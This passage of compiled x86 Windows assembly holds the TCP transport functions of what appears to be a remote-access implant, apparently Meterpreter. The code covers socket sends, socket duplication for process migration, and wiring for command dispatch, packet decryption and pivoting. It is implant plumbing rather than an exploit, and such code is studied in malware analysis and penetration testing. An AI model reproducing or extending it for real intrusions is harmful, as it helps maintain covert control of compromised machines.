	movl	%eax, -16(%ebp)
	movl	$0, -20(%ebp)
	movl	$0, -12(%ebp)
	movl	8(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_acquire
	jmp	L132
L133:
	movl	16(%ebp), %eax
	subl	-12(%ebp), %eax
	movl	%eax, %ecx
	movl	12(%ebp), %edx
	movl	-12(%ebp), %eax
	addl	%eax, %edx
	movl	-16(%ebp), %eax
	movl	(%eax), %eax
	movl	$0, 12(%esp)
	movl	%ecx, 8(%esp)
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__send@16, %eax
	call	*%eax
	subl	$16, %esp
	movl	%eax, -20(%ebp)
	movl	-20(%ebp), %eax
	addl	%eax, -12(%ebp)
L132:
	movl	-12(%ebp), %eax
	cmpl	16(%ebp), %eax
	jb	L133
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -20(%ebp)
	cmpl	$0, -20(%ebp)
	je	L134
	movl	-12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC53, (%esp)
	call	_real_dprintf
	jmp	L135
L134:
	movl	$LC54, (%esp)
	call	_real_dprintf
L135:
	movl	8(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_release
	movl	-20(%ebp), %eax
	leave
	ret
	.globl	_transport_write_tcp_config
	.def	_transport_write_tcp_config;	.scl	2;	.type	32;	.endef
_transport_write_tcp_config:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	cmpl	$0, 8(%ebp)
	je	L139
	cmpl	$0, 12(%ebp)
	je	L139
	movl	8(%ebp), %eax
	movl	52(%eax), %edx
	movl	12(%ebp), %eax
	movl	%edx, 1024(%eax)
	movl	8(%ebp), %eax
	movl	56(%eax), %eax
	movl	%eax, %edx
	movl	12(%ebp), %eax
	movl	%edx, 1028(%eax)
	movl	8(%ebp), %eax
	movl	60(%eax), %eax
	movl	%eax, %edx
	movl	12(%ebp), %eax
	movl	%edx, 1032(%eax)
	movl	8(%ebp), %eax
	movl	44(%eax), %edx
	movl	12(%ebp), %eax
	movl	$512, 8(%esp)
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_wcsncpy
L139:
	nop
	leave
	ret
	.def	_get_migrate_context_tcp;	.scl	3;	.type	32;	.endef
_get_migrate_context_tcp:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$388, 4(%esp)
	movl	$1, (%esp)
	call	_calloc
	movl	%eax, -12(%ebp)
	cmpl	$0, -12(%ebp)
	jne	L141
	movl	$14, %eax
	jmp	L142
L141:
	movl	-12(%ebp), %eax
	leal	16(%eax), %edx
	movl	8(%ebp), %eax
	movl	48(%eax), %eax
	movl	(%eax), %eax
	movl	%edx, 8(%esp)
	movl	12(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__WSADuplicateSocketA@12, %eax
	call	*%eax
	subl	$12, %esp
	testl	%eax, %eax
	je	L143
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
	movl	__imp__WSAGetLastError@0, %eax
	call	*%eax
	jmp	L142
L143:
	movl	20(%ebp), %eax
	movl	$388, (%eax)
	movl	24(%ebp), %eax
	movl	-12(%ebp), %edx
	movl	%edx, (%eax)
	movl	$0, %eax
L142:
	leave
	ret
	.def	_transport_get_config_size_tcp;	.scl	3;	.type	32;	.endef
_transport_get_config_size_tcp:
	pushl	%ebp
	movl	%esp, %ebp
	movl	$1036, %eax
	popl	%ebp
	ret
	.section .rdata,"dr"
	.align 4
LC55:
	.ascii "[TRANS TCP] Creating tcp transport for url %S\0"
	.text
	.globl	_transport_create_tcp
	.def	_transport_create_tcp;	.scl	2;	.type	32;	.endef
_transport_create_tcp:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$76, (%esp)
	call	_malloc
	movl	%eax, -12(%ebp)
	movl	$8, (%esp)
	call	_malloc
	movl	%eax, -16(%ebp)
	cmpl	$0, 12(%ebp)
	je	L147
	movl	12(%ebp), %eax
	movl	$1036, (%eax)
L147:
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC55, (%esp)
	call	_real_dprintf
	movl	$76, 8(%esp)
	movl	$0, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_memset
	movl	$8, 8(%esp)
	movl	$0, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_memset
	movl	-12(%ebp), %eax
	movl	$1, (%eax)
	movl	8(%ebp), %eax
	movl	1024(%eax), %edx
	movl	-12(%ebp), %eax
	movl	%edx, 52(%eax)
	movl	8(%ebp), %eax
	movl	1028(%eax), %eax
	movl	%eax, %edx
	movl	-12(%ebp), %eax
	movl	%edx, 56(%eax)
	movl	8(%ebp), %eax
	movl	1032(%eax), %eax
	movl	%eax, %edx
	movl	-12(%ebp), %eax
	movl	%edx, 60(%eax)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp___wcsdup, %eax
	call	*%eax
	movl	-12(%ebp), %edx
	movl	%eax, 44(%edx)
	movl	-12(%ebp), %eax
	movl	$_packet_transmit_tcp, 36(%eax)
	movl	-12(%ebp), %eax
	movl	$_configure_tcp_connection, 20(%eax)
	movl	-12(%ebp), %eax
	movl	$_transport_destroy_tcp, 28(%eax)
	movl	-12(%ebp), %eax
	movl	$_transport_reset_tcp, 16(%eax)
	movl	-12(%ebp), %eax
	movl	$_server_dispatch_tcp, 32(%eax)
	movl	-12(%ebp), %eax
	movl	$_transport_get_handle_tcp, 4(%eax)
	movl	-12(%ebp), %eax
	movl	$_transport_set_handle_tcp, 8(%eax)
	movl	-12(%ebp), %eax
	movl	-16(%ebp), %edx
	movl	%edx, 48(%eax)
	call	_current_unix_timestamp
	movl	-12(%ebp), %edx
	movl	%eax, 64(%edx)
	movl	-12(%ebp), %eax
	movl	$_get_migrate_context_tcp, 40(%eax)
	movl	-12(%ebp), %eax
	movl	$_transport_get_config_size_tcp, 12(%eax)
	movl	-12(%ebp), %eax
	leave
	ret
	.ident	"GCC: (GNU) 9.3-win32 20200320"
	.def	_strlen;	.scl	2;	.type	32;	.endef
	.def	_vsnprintf_s;	.scl	2;	.type	32;	.endef
	.def	_current_unix_timestamp;	.scl	2;	.type	32;	.endef
	.def	_sleep;	.scl	2;	.type	32;	.endef
	.def	_lock_acquire;	.scl	2;	.type	32;	.endef
	.def	_lock_release;	.scl	2;	.type	32;	.endef
	.def	_xor_bytes;	.scl	2;	.type	32;	.endef
	.def	_malloc;	.scl	2;	.type	32;	.endef
	.def	_is_null_guid;	.scl	2;	.type	32;	.endef
	.def	_memcmp;	.scl	2;	.type	32;	.endef
	.def	_decrypt_packet;	.scl	2;	.type	32;	.endef
	.def	_pivot_tree_find;	.scl	2;	.type	32;	.endef
	.def	_pivot_packet_dispatch;	.scl	2;	.type	32;	.endef
	.def	_free;	.scl	2;	.type	32;	.endef
	.def	_event_poll;	.scl	2;	.type	32;	.endef
	.def	_command_handle;	.scl	2;	.type	32;	.endef
	.def	_thread_destroy;	.scl	2;	.type	32;	.endef
	.def	_thread_create;	.scl	2;	.type	32;	.endef
	.def	_thread_run;	.scl	2;	.type	32;	.endef
	.def	_strncmp;	.scl	2;	.type	32;	.endef
	.def	_strstr;	.scl	2;	.type	32;	.endef
	.def	_strrchr;	.scl	2;	.type	32;	.endef
	.def	_atol;	.scl	2;	.type	32;	.endef
	.def	_atoi;	.scl	2;	.type	32;	.endef
	.def	_wcsncpy;	.scl	2;	.type	32;	.endef
	.def	_calloc;	.scl	2;	.type	32;	.endef
	.def	_memset;	.scl	2;	.type	32;	.endef
